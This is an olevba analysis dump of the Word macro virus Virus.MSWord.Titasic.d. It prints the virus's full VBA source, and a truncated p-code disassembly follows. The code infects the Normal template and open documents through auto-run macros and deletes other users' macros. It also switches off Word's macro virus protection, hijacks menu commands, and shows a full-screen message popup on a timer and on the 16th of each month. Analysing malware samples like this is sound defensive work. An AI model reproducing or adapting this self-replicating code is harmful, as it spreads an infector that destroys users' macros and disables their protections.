olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Angelina.bas 
in file: Virus.MSWord.Titasic.d - OLE stream: 'Macros/VBA/Angelina'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Public AD As Object, aDes As Variant, btk As String
Public NonVoldina As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function AstMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "Angelina"
nmak(1) = "Voldina"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "SNrml.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "SNrml.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\SNrml.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "Angelina" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "Angelina"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then MsgBox "Terimakasih Anda Telah" & Chr(13) & "Memproteksi Word dengan Aman", vbInformation, "Voldina Anti virus"
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonVoldina = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "Angelina" And nmak.Name <> "Voldina" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Action()
Attribute Action.VB_Description = "Jangan Ngawur Yaa.. Suniel"
Attribute Action.VB_ProcData.VB_Invoke_Func = "Normal.Angelina.Action"
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "Voldina"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "Voldina ," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
btk = 1
Voldina.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
End Sub
Sub FileOpen()
If Day(Now) = 16 Then
   btk = 2
   Voldina.Show
ElseIf (Day(Now) = 16) And (Month(Now) = 1) Then
   btk = 2
   Voldina.Show
Else
End If
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub

Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
AstMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    AstMaster
    End If
    Next
End If
If Now > DateSerial(1998, 9, 10) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="Angelina.Action"
End
End Sub
Sub ViewVBCode()
If MsgBox("Maaf.." & Chr(13) & "Ente Jangan Sock pintar untuk mengubahnya " & Chr(13) & Chr(13) _
& "Untuk info klik saja HELP - About Microsoft Word " & Chr(13) & Chr(13) _
& " Apakah Anda ingin merekam makro..?", vbExclamation + vbYesNo, "Voldina Anti Virus") _
= vbYes Then
    SendKeys "%m%s{down}~%d'Macro non-Voldina'%m"
Else
Action
End If
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
AstMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "SNrml.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
AstMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub HelpAbout()
    On Error GoTo voldna
    btk = 3
    Voldina.Show
voldna:
End Sub
Sub FileClose()
If Day(Now) = 16 Then
   btk = 2
   Voldina.Show
ElseIf (Day(Now) = 16) And (Month(Now) = 1) Then
   btk = 2
   Voldina.Show
Else
End If
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonVoldina Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".Angelina.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Macros Voldina mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-Voldina')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVBCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "Voldina" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "SNrml.dot" Then AstMaster
End Sub
Sub FileExit()
If Day(Now) = 16 Then
   btk = 2
   Voldina.Show
ElseIf (Day(Now) = 16) And (Month(Now) = 1) Then
   btk = 2
   Voldina.Show
Else
End If
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function











'This macros created & inspirated
'when my specials friends
'celebrate her birthday
' January 16, 1999

'This is special gift for you
'######################################
' I HOPE YOU REMEMBER FOR ME
' EVEN YOU HAPPY WITH OTHERS
' NEW FRIENDS
'                        ....fhrazzthy
'######################################
'fhrazzthy@most-wanted.com







-------------------------------------------------------------------------------
VBA MACRO Voldina.frm 
in file: Virus.MSWord.Titasic.d - OLE stream: 'Macros/VBA/Voldina'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 













































Dim Teks(6) As String
Private Sub CommandButton1_Click()
Do
    With Voldina
    .Height = .Height - 10
    .Width = .Width - 15
    If .Height < 25 Then Exit Do
    End With
    Beep
Loop
Unload Me
End Sub

Private Sub CommandButton2_Click()
Do
    With Voldina
    .Height = .Height - 10
    .Width = .Width - 15
    If .Height < 25 Then Exit Do
    End With
    Beep
Loop
Unload Me
btk = 3
Voldina.Show
End Sub



Private Sub Image6_Click()

End Sub

Private Sub UserForm_Activate()
If btk = 2 Then
    Ulang
ElseIf btk = 1 Then
    TT
ElseIf btk = 3 Then
    Wly
Else
End If
End Sub
Sub Wly()
With Voldina
    .Width = Width - 200
    .Caption = "F.h.r.a.z.z.t.h.y"
    .StartUpPosition = 1
End With
Image1.Visible = False
Image3.Visible = True
Image4.Visible = True
Image5.Visible = False
Image6.Visible = True
Label8.Visible = False
Label4.Visible = False
Label9.Visible = True
Label7.Visible = True

CommandButton2.Visible = False

End Sub
Sub TT()
Dim a As Byte, diam As Boolean
Dim tp&, tm!, sel!, i%

Image3.Visible = False
Image4.Visible = False
Image6.Visible = False
Label9.Visible = False
Image6.Visible = False
Label7.Visible = False
Image5.Visible = False
Label8.Visible = False

a = 1
diam = True
Voldina.Enabled = False
Label3.Visible = False
Do
    DoEvents
    sel = Timer - tm
    tp = tp + 1
    If tp Mod 300 = 0 Then
    Label4.ForeColor = Voldina.BackColor
    End If
    If tp Mod 600 = 0 Then
    Label4.ForeColor = &H80000009
End If
    If sel > 0.1 Then
        tm = Timer
        i = i + 1
        If a = 7 Then Label1.Font.Size = 16: Label1.Width = Image1.Width
        Label1.Caption = Label1.Caption & Mid(Teks(a), i, 1)
        If Mid(Teks(a), i, 1) Like "[! ]" Then Beep
            If Len(Label1.Caption) = Len(Teks(a)) Then
                If diam Then
                    Do
                    If Timer - tm > 1 Then Exit Do
                    DoEvents
                    Label4.ForeColor = Voldina.BackColor
                    Loop
                    diam = False
                    If a = 7 Then GoTo catat
                End If
            Label2.Move Label2.Left - 9
            If Label2.Left <= Label1.Left Then GoSub catat
        End If
    End If
Loop
Exit Sub
catat:
If a <> 7 Then Label1.Caption = ""
tm = Timer
Label2.Left = Label1.Left + Label1.Width
a = a + 1
i = 0
diam = True
        If a = 7 Then
            Label4.Visible = True
            Image1.Visible = True
            Voldina.Enabled = True
            Label3.Visible = True
            CommandButton1.SetFocus
            Image1.Picture = LoadPicture(System.PrivateProfileString("", _
            "HKEY_CURRENT_USER\Control Panel\desktop", "Wallpaper"))
            Exit Sub
        End If
Return
End Sub





Private Sub UserForm_Layout()
Dim waktu%, saat$
waktu = Val(Format(Time, "hh"))
Select Case waktu
Case 0 To 8
saat = "pagi"
Case 9 To 14
saat = "siang"
Case 15 To 17
saat = "sore"
Case 18 To 23
saat = "malam"
Case Else
Label4.Visible = False
End Select

Teks(1) = "Mas Yudi sayangku maaf bila hal ini akan mengganggumu "
Teks(2) = "Karena hanya dengan inilah dinda mengingatkan akan wajahku yang manis ini"
Teks(3) = "S'bab kutahu  kalau kamu sering lirik sana-sini"
Teks(4) = "Tapi akoe sangat maklum akan tugasmu ini penuh dengan SLI"
Teks(5) = "Yang Kumau agar kamu S'lalu ingat akan cantiknya parasku"
Teks(6) = "Salam sayang dariku hanya untukmu seorang"
Label2.Left = Label1.Left + Label1.Width
Label3.Caption = "Hacked by : Fhrazzthy '96" & Chr(13) & Chr(13) & "Thanks to : " & Chr(13) & Application.UserName
Label4.Caption = "Selamat " & saat & Chr(13) & "Maaf bila " & Application.UserName & " merasa terganggu"
End Sub
Private Sub UserForm_Terminate()
    Dim i As Integer
    For i = 1 To 10
        Beep
    Next
End Sub
Sub Ulang()
Dim waktu%, bln$, kt$
With Voldina
    .Width = Width - 200
    .Caption = "Happy Birthday"
    .StartUpPosition = 1
End With
Image1.Visible = False
Image2.Visible = False
Image3.Visible = False
Image4.Visible = False
Image6.Visible = False
Label4.Visible = False
Label9.Visible = False
Label7.Visible = False

CommandButton2.Visible = False

Image5.Visible = True
Label8.Visible = True

kt = Val(Format(Date, "mm"))
Select Case kt
Case 2: bln = "sebulan yang lalu"
Case 3: bln = "2 bulan yang lewat"
Case 4: bln = "3 bulan yang lalu"
Case 5: bln = "4 bulan kemarin"
Case 6: bln = "5 bulan lalu"
Case 7: bln = "setengah tahun lagi"
Case 8: bln = "5 bulan kedepan"
Case 9: bln = "4 bulan mendatang"
Case 10: bln = "3 bulan lagi"
Case 11: bln = "tinggal 2 bulan lagi"
Case 12: bln = "sebulan lagi"
End Select
If Day(Now) = 16 And Month(Now) = 1 Then
   Image5.Visible = True
   Label8.Visible = False
   With Voldina
    .Caption = "Happy Birthday Dhien"
   End With
ElseIf Day(Now) = 16 Then
   With Voldina
    .Caption = "Pesan From Fhrazzthy"
   End With
   Image5.Visible = False
   Label8.Visible = True
   Label8.Caption = "!! INGAT !!" & Chr(13) & bln & Chr(13) & _
                 "Voldina ulang tahun"
Else
With Voldina
    .Caption = "Pesan From Fhrazzthy"
   End With
Image5.Visible = False
Label8.Visible = True
Label8.Caption = "!! INGAT !!" & Chr(13) & bln & Chr(13) & _
                 "Voldina ulang tahun"

End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Titasic.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Angelina - 15001 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' 	VarDefn aDes (As Variant)
' 	VarDefn btk (As String)
' Line #4:
' 	Dim (Public) 
' 	VarDefn NonVoldina (As Boolean)
' 	VarDefn afound (As Boolean)
' 	VarDefn hapus (As Boolean)
' 	VarDefn reset (As Boolean)
' 	VarDefn aExc (As Boolean)
' 	VarDefn DocCount (As Boolean)
' Line #5:
' 	FuncDefn (Function AstMaster())
' Line #6:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn nmak (As String)
' Line #7:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #8:
' 	Dim 
' 	VarDefn aSrc
' Line #9:
' 	OnError selesai 
' Line #10:
' 	LitStr 0x0008 "Angelina"
' 	LitDI2 0x0000 
' 	ArgsSt nmak 0x0001 
' Line #11:
' 	LitStr 0x0007 "Voldina"
' 	LitDI2 0x0001 
' 	ArgsSt nmak 0x0001 
' Line #12:
' Line #13:
' 	Ld MacroContainer 
' 	St aSrc 
' Line #14:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #15:
' 	Ld DocCount 
' 	Not 
' 	IfBlock 
' Line #16:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #17:
' 	Ld aSrc 
' 	LitStr 0x0009 "SNrml.dot"
' 	Ne 
' 	ElseIfBlock 
' Line #18:
' 	Ld NT 
' 	St aSrc 
' Line #19:
' 	EndIfBlock 
' Line #20:
' Line #21:
' 	Ld aSrc 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #22:
' 	Ld NT 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld AD 
' 	Set aDes 
' Line #23:
' 	Ld aSrc 
' 	Ld AD 
' 	Eq 
' 	ElseIfBlock 
' Line #24:
' 	Ld AD 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #25:
' 	Ld aSrc 
' 	LitStr 0x0009 "SNrml.dot"
' 	Eq 
' 	ElseIfBlock 
' Line #26:
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #27:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	St aSrc 
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #31:
' 	StartWithExpr 
' 	Ld aDes 
' 	MemLd VBProject 
' 	With 
' Line #32:
' 	Ld hapus 
' 	Not 
' 	MemLdWith Description 
' 	LitStr 0x0008 "Angelina"
' 	Eq 
' 	And 
' 	MemLdWith VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #33:
' 	Ld aSrc 
' 	Ld aDes 
' 	Ld nmak 
' 	ArgsCall Mcopy 0x0003 
' Line #34:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #35:
' 	LitStr 0x0008 "Angelina"
' 	MemStWith Description 
' Line #36:
' 	Ld aDes 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #38:
' 	Ld NT 
' 	St CustomizationContext 
' Line #39:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #40:
' 	LineCont 0x0004 10 00 08 00
' 	LitDI2 0x004D 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0001 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0015 "ToolsRecordMacroStart"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #41:
' 	Ld aDes 
' 	ArgsMemCall Save 0x0000 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitStr 0x000A "ViewVbCode"
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #44:
' 	ElseBlock 
' Line #45:
' 	GoTo Aksi 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndWith 
' Line #48:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #49:
' 	ArgsCall Refresh 0x0000 
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	Label Aksi 
' Line #52:
' 	Ld aExc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #53:
' 	ExitFunc 
' Line #54:
' 	Label selesai 
' Line #55:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI4 0xC471 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0016 "Terimakasih Anda Telah"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001C "Memproteksi Word dengan Aman"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0012 "Voldina Anti virus"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #56:
' 	EndFunc 
' Line #57:
' Line #58:
' 	FuncDefn (Sub Mhapus(Sfile))
' Line #59:
' 	Dim 
' 	VarDefn nmak (As Object)
' Line #60:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	Ld Sfile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #61:
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NonVoldina 
' 	EndIf 
' Line #62:
' 	LineCont 0x0004 0C 00 04 00
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0008 "Angelina"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0007 "Voldina"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #63:
' 	LitVarSpecial (True)
' 	St hapus 
' Line #64:
' 	Ld reset 
' 	IfBlock 
' Line #65:
' 	Ld Sfile 
' 	MemLd FullName 
' 	Ld nmak 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #66:
' 	ElseBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub Mcopy(Sfile, Dfile, nmak))
' Line #73:
' 	Dim 
' 	VarDefn aNmak
' Line #74:
' 	StartForVariable 
' 	Ld aNmak 
' 	EndForVariable 
' 	Ld nmak 
' 	ForEach 
' Line #75:
' 	Ld Sfile 
' 	Ld Dfile 
' 	MemLd FullName 
' 	Ld aNmak 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #76:
' 	StartForVariable 
' 	Next 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub Action())
' Line #79:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #82:
' 	LitStr 0x0007 "Voldina"
' 	MemStWith Caption 
' Line #83:
' 	LitDI2 0x0064 
' 	MemLdWith ActivePane 
' 	MemLd View 
' 	MemLd Zoom 
' 	MemSt Percentage 
' Line #84:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #85:
' 	LitVarSpecial (False)
' 	MemStWith DisplayRulers 
' Line #86:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHorizontalScrollBar 
' Line #87:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalRuler 
' Line #88:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalScrollBar 
' Line #89:
' 	LitVarSpecial (False)
' 	MemLdWith View 
' 	MemSt ShowTextBoundaries 
' Line #90:
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Position 
' Line #91:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	With 
' Line #92:
' 	LitStr 0x0009 "Voldina ,"
' 	LitStr 0x0002 "  "
' 	Concat 
' 	Ld Date 
' 	Concat 
' 	MemStWith Caption 
' Line #93:
' 	LitDI2 0x0003 
' 	MemStWith Style 
' Line #94:
' 	LitDI2 0x0119 
' 	MemStWith FaceId 
' Line #95:
' 	EndWith 
' Line #96:
' 	LitDI2 0x0006 
' 	MemLdWith View 
' 	MemSt TypeOf 
' Line #97:
' 	ArgsCall Read 0x0000 
' Line #98:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	With 
' Line #99:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #100:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsMemCallWith PresetGradient 0x0003 
' Line #101:
' 	EndWith 
' Line #102:
' 	LitDI2 0x0001 
' 	St btk 
' Line #103:
' 	Ld Voldina 
' 	ArgsMemCall Show 0x0000 
' Line #104:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #105:
' 	EndWith 
' Line #106:
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #107:
' 	ArgsCall WBT 0x0000 
' Line #108:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #109:
' 	ArgsCall WBF 0x0000 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Sub FileOpen())
' Line #112:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	IfBlock 
' Line #113:
' 	LitDI2 0x0002 
' 	St btk 
' Line #114:
' 	Ld Voldina 
' 	ArgsMemCall Show 0x0000 
' Line #115:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #116:
' 	LitDI2 0x0002 
' 	St btk 
' Line #117:
' 	Ld Voldina 
' 	ArgsMemCall Show 0x0000 
' Line #118:
' 	ElseBlock 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	ArgsCall WBT 0x0000 
' Line #121:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #122:
' 	ArgsCall WBF 0x0000 
' Line #123:
' 	ArgsCall AutoOpen 0x0000 
' Line #124:
' 	ElseBlock 
' Line #125:
' 	ArgsCall WBF 0x0000 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	EndSub 
' Line #128:
' Line #129:
' 	FuncDefn (Sub AutoOpen())
' Line #130:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #131:
' 	ArgsCall AstMaster 0x0000 
' Line #132:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #133:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #134:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #135:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set AD 
' Line #136:
' 	LitVarSpecial (True)
' 	St DocCount 
' Line #137:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #138:
' 	ArgsCall AstMaster 0x0000 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	StartForVariable 
' 	Next 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	Ld Now 
' 	LitDI2 0x07CE 
' 	LitDI2 0x0009 
' 	LitDI2 0x000A 
' 	ArgsLd DateSerial 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Now 
' 	LitStr 0x0008 "00:45:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x000F "Angelina.Action"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' 	EndIf 
' Line #143:
' 	End 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Sub ViewVBCode())
' Line #146:
' 	LineCont 0x000C 15 00 00 00 21 00 00 00 2A 00 00 00
' 	LitStr 0x0006 "Maaf.."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002A "Ente Jangan Sock pintar untuk mengubahnya "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0031 "Untuk info klik saja HELP - About Microsoft Word "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0023 " Apakah Anda ingin merekam makro..?"
' 	Concat 
' 	Ld vbExclamation 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x0012 "Voldina Anti Virus"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #147:
' 	LitStr 0x0022 "%m%s{down}~%d'Macro non-Voldina'%m"
' 	ArgsCall SendKeys 0x0001 
' Line #148:
' 	ElseBlock 
' Line #149:
' 	ArgsCall Action 0x0000 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Sub AutoExec())
' Line #153:
' 	OnError (Resume Next) 
' Line #154:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #155:
' 	LitVarSpecial (True)
' 	St aExc 
' Line #156:
' 	ArgsCall AstMaster 0x0000 
' Line #157:
' 	ArgsCall WBT 0x0000 
' Line #158:
' 	LitVarSpecial (False)
